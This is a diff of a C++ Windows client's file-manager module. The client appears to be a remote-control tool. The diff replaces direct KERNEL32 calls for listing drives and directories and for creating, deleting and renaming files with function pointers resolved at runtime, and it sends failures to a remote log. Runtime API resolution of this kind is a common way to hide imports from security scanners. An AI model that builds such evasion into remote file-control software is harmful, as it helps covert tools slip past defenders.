@@ -5,18 +5,27 @@ extern Cliente* cCliente;
 
 std::vector<struct sDrives> Drives() {
 	std::vector<struct sDrives> vcOutput;
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pGetLogicalDriveStringsA ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pGetVolumeInformationA ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pGetDriveTypeA ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pGetDiskFreeSpaceExA) {
+		__DBG_("No cargaron todas las funciones para listar los discos");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: Drives");
+		return vcOutput;
+	}
+
 	char cDrives[512];
 	memset(cDrives, 0, sizeof(cDrives));
-	int iRet = GetLogicalDriveStrings(sizeof(cDrives), cDrives);
+	int iRet = cCliente->mod_dynamic->KERNEL32_FM.pGetLogicalDriveStringsA(sizeof(cDrives), cDrives);
 	if (iRet > 0) {
 		char* p1 = cDrives;
 		char* p2;
 		while (*p1 != '\0' && (p2 = strchr(p1, '\0')) != nullptr) {
 			char cLabel[128]; memset(cLabel, '\0', 128);
 			char cType[128]; memset(cType, '\0', 128);
-			iRet = GetVolumeInformationA(p1, cLabel, 128, nullptr, nullptr, nullptr, cType, 128);
+			iRet = cCliente->mod_dynamic->KERNEL32_FM.pGetVolumeInformationA(p1, cLabel, 128, nullptr, nullptr, nullptr, cType, 128);
 			if (strlen(cLabel) <= 0) {
-				UINT dt = GetDriveTypeA(p1);
+				UINT dt = cCliente->mod_dynamic->KERNEL32_FM.pGetDriveTypeA(p1);
 				switch (dt) {
 				case 0:
 					strncpy(cLabel, "Desconocido", 12);
@@ -47,7 +56,7 @@ std::vector<struct sDrives> Drives() {
 			struct sDrives sDrive;
 			if (iRet != 0) {
 				__int64 FreeBytesAvaiableToUser, TotalFreeBytes;
-				GetDiskFreeSpaceEx(p1, (PULARGE_INTEGER)&FreeBytesAvaiableToUser, (PULARGE_INTEGER)&TotalFreeBytes, nullptr);
+				cCliente->mod_dynamic->KERNEL32_FM.pGetDiskFreeSpaceExA(p1, (PULARGE_INTEGER)&FreeBytesAvaiableToUser, (PULARGE_INTEGER)&TotalFreeBytes, nullptr);
 				double dFreegigs = (((double)(FreeBytesAvaiableToUser / 1024) / 1024) / 1024);
 				double dTotalgigs = (((double)(TotalFreeBytes / 1024) / 1024) / 1024);
 				strncpy(sDrive.cLetter, p1, 10);
@@ -76,6 +85,15 @@ std::vector<struct sDrives> Drives() {
 std::vector<std::string> vDir(c_char* cPath) {
 	std::vector<std::string> vcFolders;
 	std::vector<std::string> vcFiles;
+
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pFindFirstFileA ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pFileTimeToSystemTime ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pFindNextFileA ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pFindClose) {
+		__DBG_("No cargaron todas las funciones para listar directorios");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: vDir");
+		return vcFolders;
+	}
 	
 	WIN32_FIND_DATA win32Archivo;
 	struct stat info;
@@ -86,7 +104,7 @@ std::vector<std::string> vDir(c_char* cPath) {
 	SYSTEMTIME FileDate;
 	char cFecha[15];
 	char cTmpdir[2048];
-	hFind = FindFirstFileA(szDir, &win32Archivo);
+	hFind = cCliente->mod_dynamic->KERNEL32_FM.pFindFirstFileA(szDir, &win32Archivo);
 
 	if (!hFind) {
 		__DBG_("No se pudo listar el directorio " + std::string(szDir));
@@ -100,7 +118,7 @@ std::vector<std::string> vDir(c_char* cPath) {
 		}
 		//cFecha tmpdir baia.cFileName win32Archivo.nFilesizeLow
 
-		FileTimeToSystemTime(&win32Archivo.ftCreationTime, &FileDate);
+		cCliente->mod_dynamic->KERNEL32_FM.pFileTimeToSystemTime(&win32Archivo.ftCreationTime, &FileDate);
 		
 		ZeroMemory(cFecha, sizeof(cFecha));
 		ZeroMemory(cTmpdir, sizeof(cTmpdir));
@@ -132,32 +150,42 @@ std::vector<std::string> vDir(c_char* cPath) {
 
 		}
 
-	} while (FindNextFile(hFind, &win32Archivo) != 0);
+	} while (cCliente->mod_dynamic->KERNEL32_FM.pFindNextFileA(hFind, &win32Archivo) != 0);
 	
 	if (hFind) {
-		FindClose(hFind);
+		cCliente->mod_dynamic->KERNEL32_FM.pFindClose(hFind);
 	}
 
 	for (auto item : vcFiles) {
 		vcFolders.push_back(item);
-		
 	}
 
 	return vcFolders;
 }
 
 void CrearFolder(c_char* cPath) {
-	if (!CreateDirectoryA(static_cast<LPCSTR>(cPath), nullptr)) {
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateDirectoryA) {
+		__DBG_("No cargaron todas las funciones para listar los discos");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: CreateDirectoryA");
+		return;
+	}
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateDirectoryA(static_cast<LPCSTR>(cPath), nullptr)) {
 		cCliente->m_RemoteLog("[X] CreateDirectoryA error: " + std::to_string(GetLastError()));
 	}
 }
 
 void CrearArchivo(c_char* cPath) {
-	HANDLE hNewFile = CreateFileA(static_cast<LPCSTR>(cPath), GENERIC_READ | GENERIC_WRITE, 
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateFileA ||
+		!cCliente->mod_dynamic->KERNEL32_FM.pCloseHandle) {
+		__DBG_("No cargaron todas las funciones para crear el archivo");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: CrearArchivo");
+		return;
+	}
+	HANDLE hNewFile = cCliente->mod_dynamic->KERNEL32_FM.pCreateFileA(static_cast<LPCSTR>(cPath), GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, 
 		CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (hNewFile != INVALID_HANDLE_VALUE) {
-		CloseHandle(hNewFile);
+		cCliente->mod_dynamic->KERNEL32_FM.pCloseHandle(hNewFile);
 		hNewFile = nullptr;
 	} else {
 		cCliente->m_RemoteLog("[X] CreateFileA error: " + std::to_string(GetLastError()));
@@ -165,13 +193,23 @@ void CrearArchivo(c_char* cPath) {
 }
 
 void BorrarArchivo(c_char* cPath) {
-	if (!DeleteFile(static_cast<LPCSTR>(cPath))) {
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pDeleteFileA) {
+		__DBG_("No cargaron todas las funciones para borrar el archivo");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: BorrarArchivo");
+		return;
+	}
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pDeleteFileA(static_cast<LPCSTR>(cPath))) {
 		cCliente->m_RemoteLog("[X] DeleteFile error: " + std::to_string(GetLastError()));
 	}
 }
 
 void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre) {
-	if (!MoveFile(static_cast<LPCSTR>(cPath), static_cast<LPCSTR>(cNuevoNombre))) {
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pMoveFileA) {
+		__DBG_("No cargaron todas las funciones para mover el archivo");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: MoveFileA");
+		return;
+	}
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pMoveFileA(static_cast<LPCSTR>(cPath), static_cast<LPCSTR>(cNuevoNombre))) {
 		error();
 		__DBG_("Error renombrando archivo");
 		__DBG_(std::string(cPath) + "|" + std::string(cNuevoNombre));
@@ -180,7 +218,12 @@ void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre) {
 }
 
 void BorrarFolder(c_char* cPath) {
-	if (!RemoveDirectoryA(static_cast<LPCSTR>(cPath))) {
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pRemoveDirectoryA) {
+		__DBG_("No cargaron todas las funciones para remover el directorio");
+		cCliente->m_RemoteLog("[X] Dynamic_load error: RemoveDirectoryA");
+		return;
+	}
+	if (!cCliente->mod_dynamic->KERNEL32_FM.pRemoveDirectoryA(static_cast<LPCSTR>(cPath))) {
 		cCliente->m_RemoteLog("[X] RemoveDirectoryA error: " + std::to_string(GetLastError()));
 	}
 }
